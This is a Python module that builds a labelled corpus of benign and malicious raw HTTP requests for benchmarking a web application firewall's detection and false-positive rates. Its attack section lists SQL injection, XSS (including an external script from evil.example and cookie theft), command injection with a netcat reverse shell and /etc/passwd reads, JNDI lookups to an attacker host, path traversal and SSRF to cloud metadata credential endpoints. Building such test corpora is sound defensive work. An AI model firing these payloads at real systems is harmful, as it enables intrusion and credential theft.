"""标注语料库 — 攻击/正常样本, 用于检出率、误报率与吞吐基准.

每个样本都是一份完整的原始 HTTP 请求; ``expect_block`` 表示期望被拦截。
正常样本特意包含 "看起来像攻击" 的良性输入 (例如 "select the best laptop"),
用于检验规则引擎的精确度。
"""
from __future__ import annotations

from dataclasses import dataclass
from urllib.parse import quote

UA_BROWSER = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36"


@dataclass(frozen=True, slots=True)
class Sample:
    raw: bytes
    category: str
    expect_block: bool

    @property
    def kind(self) -> str:
        return "attack" if self.expect_block else "benign"


def _req(method: str, target: str, headers: dict[str, str] | None = None,
         body: bytes = b"", host: str = "shop.example.com") -> bytes:
    base = {"Host": host, "User-Agent": UA_BROWSER, "Accept": "*/*"}
    base.update(headers or {})
    head = [f"{method} {target} HTTP/1.1"] + [f"{k}: {v}" for k, v in base.items()]
    if body:
        head.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(head) + "\r\n\r\n").encode("latin-1") + body


BENIGN_QUERIES = [
    "/", "/index.html", "/health", "/api/v1/products?page=2&limit=20",
    "/api/v1/users?sort=created_at&order=desc",
    "/search?q=select+the+best+laptop+for+students",
    "/search?q=union+station+opening+hours",
    "/search?q=order+by+popularity",
    "/search?q=drop+in+the+bucket+lyrics",
    "/search?q=where+is+my+package",
    "/search?q=1+or+2+items+available",
    "/product?id=1024", "/product?id=42&color=red",
    "/page?name=John+Smith", "/page?name=%E5%BC%A0%E4%B8%89",
    "/comments?page=1", "/download?file=readme.txt",
    "/download?file=invoice-2026-01.pdf", "/go?next=/cart",
    "/api/user", "/api/orders", "/api/health", "/robots.txt", "/sitemap.xml",
    "/static/js/app.4f2a1c.js", "/static/css/main.css", "/favicon.ico",
    "/blog/how-to-select-a-camera?ref=newsletter",
    "/checkout?coupon=SAVE10&currency=USD",
    "/track?code=1Z999AA10123456784",
    "/filter?price_min=100&price_max=500&brand=acme",
    "/api/v2/report?format=csv&range=last-30-days",
    "/languages?lang=en-US&fallback=zh-CN",
    "/oauth/callback?code=abc.def.ghi&state=xyz",
    "/verify?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature",
    "/math?expr=2%2B3*4%2F2", "/search?q=C%2B%2B+tutorial",
    "/search?q=100%25+cotton+shirt",
    "/search?q=a%3Db+and+c%3Dd",
    "/share?text=Hello%20World!%20%3C3",
    "/files/report%202026.pdf",
    "/api/items?ids=1,2,3,4,5&include=metadata",
    "/metrics?since=2026-09-01T00:00:00Z",
    "/api/search?q=javascript%20basics%20for%20beginners",
    "/api/search?q=script%20writing%20tips",
    "/docs/sql/union-queries-explained",
    "/docs/security/xss-prevention-guide",
    "/docs/ops/etc-passwd-best-practices",
    "/wiki/File_inclusion_vulnerability",
    "/help?topic=redirect-after-login",
    "/help?topic=ssrf-mitigation",
    "/api/time?tz=UTC%2B08:00",
    "/api/ping?address=example.com",
    "/api/lookup?domain=trusted-partner.com",
    "/api/media?url=https://cdn.example.com/logo.png",
    "/api/media?src=/assets/hero.jpg",
    "/notes?title=O%27Brien%20report",
    "/notes?title=He%20said%20%22hello%22",
    "/api/flags?enabled=true&debug=false",
    "/api/system?password_policy=strict",
    "/api/alerts?message=Connection+timeout+after+30+seconds",
    "/api/alerts?message=Warning%3A+low+disk+space",
    "/api/tickets?subject=Unclosed+quote+in+invoice+PDF",
    "/api/tickets?subject=Error+500+when+uploading",
]

BENIGN_BODIES = [
    ("POST", "/api/login", "username=alice&password=CorrectHorseBattery42"),
    ("POST", "/api/feedback", "rating=5&comment=Great+product%2C+fast+shipping!"),
    ("POST", "/api/login", "username=o'brien&password=it%27s-secret"),
    ("POST", "/api/comment", "name=Bob&message=I+checked+the+documentation."),
    ("POST", "/api/order", "sku=ABC-123&qty=2&note=Please+leave+at+door"),
    ("POST", "/api/search", "query=1+inch+pipe+fittings"),
    ("POST", "/api/profile", '{"display_name":"María López","bio":"Frontend dev"}'),
    ("POST", "/api/profile", '{"nickname":"a<b>c","theme":"dark"}'),
    ("POST", "/api/upload", "filename=invoice-2026.pdf&chunk=1&total=12"),
    ("POST", "/api/settings", "locale=en-US&timezone=America%2FLos_Angeles"),
]

ATTACKS: list[tuple[str, bytes]] = []


def _attack(category: str, method: str, target: str, headers=None, body=b"") -> None:
    ATTACKS.append((category, _req(method, target, headers, body)))


# --- SQL 注入 ---
for payload in [
    "1' OR '1'='1", "1 OR 1=1", "1' OR 1=1--", "' OR 'x'='x", "1) OR (1=1",
    "admin'--", "' OR 1=1#", "1' AND '1'='1' /*", '" OR "1"="1',
    "1' AND 1=1 AND '1'='1",
]:
    _attack("sqli", "GET", f"/search?q={quote(payload)}")
for payload in ["1 UNION SELECT username,password FROM users",
                "-1 UNION SELECT NULL,NULL,NULL--",
                "1 UNION ALL SELECT NULL,version()--",
                "' UNION SELECT @@version,user--",
                "1' SELECT * FROM information_schema.tables--"]:
    _attack("sqli", "GET", f"/product?id={quote(payload)}")
for payload in ["1' AND SLEEP(3)--", "1 AND SLEEP(3)", "1';SELECT PG_SLEEP(3)--",
                "1;WAITFOR DELAY '0:0:3'--", "1 OR SLEEP(3)#"]:
    _attack("sqli", "GET", f"/search?q={quote(payload)}")
for payload in ["'; DROP TABLE users--", "1'; INSERT INTO users VALUES(1)--",
                "1; DELETE FROM sessions WHERE 1=1--"]:
    _attack("sqli", "GET", f"/search?q={quote(payload)}")
for payload in ["1' AND extractvalue(1,concat(0x7e,version()))--",
                "1 AND updatexml(1,concat(0x7e,user()),1)",
                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version())x FROM information_schema.tables GROUP BY x)y)--"]:
    _attack("sqli", "GET", f"/product?id={quote(payload)}")
_attack("sqli", "POST", "/api/login", body=b"username=admin'--&password=x")
_attack("sqli", "POST", "/api/search",
        body=b'{"query":"1\' OR \'1\'=\'1","limit":10}')

# --- XSS ---
for payload in [
    "<script>alert(1)</script>", '<script src=//evil.example/x.js></script>',
    "\"><script>alert(document.cookie)</script>",
    "'><script>alert('xss')</script>", "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<img src=x onerror=alert(1)>", "<svg/onload=alert(document.domain)>",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\" onmouseover=\"alert(1)", "' onfocus='alert(1)' autofocus='",
    "javascript:alert(document.cookie)",
    "<marquee onstart=alert(1)>", "<object data=javascript:alert(1)>",
    "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
    "%3Csvg%2Fonload%3Dalert(1)%3E",
    "<img src=x onerror=prompt(1)>", "<template><script>alert(1)</script></template>",
    "<a href=\"javascript:alert(1)\">click</a>",
]:
    _attack("xss", "GET", f"/page?name={quote(payload)}")
_attack("xss", "POST", "/api/comment",
        body=b"name=bob&message=<script>alert(document.cookie)</script>")
_attack("xss", "POST", "/api/comment",
        body=b'{"message":"<img src=x onerror=alert(1)>"}')

# --- 命令注入 ---
for payload in ["127.0.0.1;cat /etc/passwd", "127.0.0.1|whoami", "127.0.0.1&&id",
                "; uname -a", "| nc 10.0.0.1 4444 -e /bin/sh",
                "$(cat /etc/passwd)", "`id`", "127.0.0.1; powershell -enc aQBlAHgA"]:
    _attack("rce", "GET", f"/ping?ip={quote(payload)}")
_attack("rce", "GET", "/?x=${jndi:ldap://evil.example/a}")
_attack("rce", "GET", "/", headers={"X-Api-Version": "${jndi:rmi://10.0.0.1:1099/x}"},
        )
_attack("rce", "POST", "/api/exec", body=b"cmd=system('cat /etc/shadow');")

# --- 路径穿越 / 文件读取 ---
for payload in ["../../../../../../../../etc/passwd", "/etc/passwd",
                "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                "/etc/shadow", "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ", "..\\..\\..\\windows\\win.ini",
                "../../../../../../boot.ini", "/WEB-INF/web.xml",
                "file:///etc/passwd"]:
    _attack("lfi", "GET", f"/download?file={quote(payload)}")

# --- SSRF ---
for payload in ["http://127.0.0.1:8080/admin", "http://localhost:22/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://10.0.0.5/internal/metrics", "http://192.168.1.1/router",
                "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stat",
                "file:///etc/passwd", "http://metadata.google.internal/computeMetadata/v1/",
                "http://[::1]:8080/"]:
    _attack("ssrf", "GET", f"/fetch?url={quote(payload)}")

# --- 扫描器指纹 ---
for agent in ["sqlmap/1.7.2#stable (http://sqlmap.org)", "Nikto/2.5.0",
              "Nmap Scripting Engine", "masscan/1.3", "nuclei - Open Source",
              "Acunetix-Aspect", "w3af.org", "W13Scan/1.0", "gobuster/3.6",
              "Mozilla/5.0 (compatible; ZGrab/2.0)", "zgrab/0.x",
              "Mozilla/5.0 (compatible; Nmap Scripting Engine)" ]:
    _attack("scanner", "GET", "/", headers={"User-Agent": agent})

# --- 协议异常 / 侦察 ---
_attack("protocol", "GET", "/api/items", headers={"X-Originating-URL": "https://ok.example/a%0d%0aX-Injected: 1"})
_attack("protocol", "GET", "/api/items", headers={"Referer": "https://ok.example/" + "a" * 9000})
_attack("recon", "GET", "/.env")
_attack("recon", "GET", "/.git/config")
_attack("recon", "GET", "/phpmyadmin/index.php")
_attack("recon", "GET", "/wp-login.php")
_attack("recon", "GET", "/actuator/env")
_attack("recon", "GET", "/debug")
_attack("recon", "GET", "/config/backup.zip")


def build_corpus() -> list[Sample]:
    samples: list[Sample] = []
    for target in BENIGN_QUERIES:
        samples.append(Sample(_req("GET", target), "benign", False))
    for method, target, body in BENIGN_BODIES:
        samples.append(Sample(_req(method, target, body=body.encode()), "benign", False))
    samples.append(Sample(_req("GET", "/", headers={"User-Agent": ""}), "benign-empty-ua", False))
    for category, raw in ATTACKS:
        samples.append(Sample(raw, category, True))
    return samples


def corpus_stats(samples: list[Sample]) -> dict:
    stats: dict[str, int] = {}
    for sample in samples:
        key = sample.category if sample.expect_block else "benign"
        stats[key] = stats.get(key, 0) + 1
    stats["total"] = len(samples)
    return stats


if __name__ == "__main__":
    corpus = build_corpus()
    print(corpus_stats(corpus))
